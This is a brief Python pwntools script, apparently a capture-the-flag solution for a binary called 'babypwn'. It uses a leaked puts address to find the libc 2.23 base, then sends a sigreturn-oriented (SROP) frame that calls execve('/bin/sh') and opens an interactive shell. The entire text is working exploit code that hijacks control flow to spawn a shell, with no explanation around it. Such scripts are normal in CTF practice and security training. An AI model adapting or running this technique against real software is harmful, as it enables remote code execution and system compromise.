from pwn import*
#p = remote('')
p =process('./babypwn')
libc = ELF('./libc-2.23.so')
p.recvuntil('gift: ')
puts_addr = int(p.recvuntil('\n',drop = True),16)
libc_base = puts_addr - libc.sym['puts']
bin_sh = libc_base + 0x18CD57
syscall_ret = libc_base + 0x1014D7
ret_addr = 0x7fffffffdf18
sigframe = SigreturnFrame()
sigframe.rax = constants.SYS_execve
sigframe.rdi = bin_sh  # "/bin/sh" 's addr
sigframe.rsi = 0x0
sigframe.rdx = 0x0
sigframe.rsp = ret_addr
sigframe.rip = syscall_ret
p.send(sigframe)
p.interactive()
